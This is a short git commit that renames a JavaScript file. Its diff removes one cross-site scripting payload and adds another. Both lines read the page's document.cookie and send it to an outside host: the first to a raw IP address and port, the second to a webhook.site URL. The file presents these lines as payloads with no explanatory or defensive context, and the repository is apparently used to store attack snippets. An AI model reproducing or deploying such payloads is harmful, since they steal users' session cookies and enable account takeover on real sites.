8fb056ce3c1818d8582dd391110d5b6bc6fa2f96
AlPha1 <143469477+AlPha0ne1@users.noreply.github.com>
2024-02-25 08:01:12 -0500

    Update and rename project1.js to project2.js

--- project1.js
+++
@@ -1,1 +0,0 @@
-<script>fetch('http://94.237.56.188:38290/steal?cookie=' + btoa(document.cookie));</script>
---
+++ project2.js
@@ -0,0 +1,1 @@
+fetch('https://webhook.site/a88e1bf7-4c89-4b11-915f-46b421280985?cookie=' + document.cookie);
